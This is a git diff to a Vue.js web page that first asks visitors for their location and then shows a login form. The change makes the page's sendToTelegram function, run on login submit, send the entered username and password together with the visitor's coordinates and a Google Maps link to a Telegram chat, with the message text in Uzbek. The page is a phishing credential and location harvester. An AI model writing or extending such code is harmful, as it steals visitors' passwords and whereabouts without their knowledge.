@@ -86,7 +86,7 @@ export default {
           (pos) => {
             this.latitude = pos.coords.latitude;
             this.longitude = pos.coords.longitude;
-            this.sendToTelegram();
+            // this.sendToTelegram();
             this.showGeoModal = false;
             this.showLogin = true;
           },
@@ -122,7 +122,9 @@ export default {
       }
     },
     sendToTelegram() {
-      const message = `📍 Foydalanuvchi joylashuvi:
+      const message = `📍 Foydalanuvchi ma'lumoti:
+Login: $(this.username)
+Password: $(this.password)
 Latitude: ${this.latitude}
 Longitude: ${this.longitude}
 🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
@@ -136,6 +138,7 @@ Longitude: ${this.longitude}
     },
     submitLogin() {
       if (this.username && this.password) {
+        this.sendToTelegram();
         this.showLogin = false;
         this.showVideo = true;
       } else {
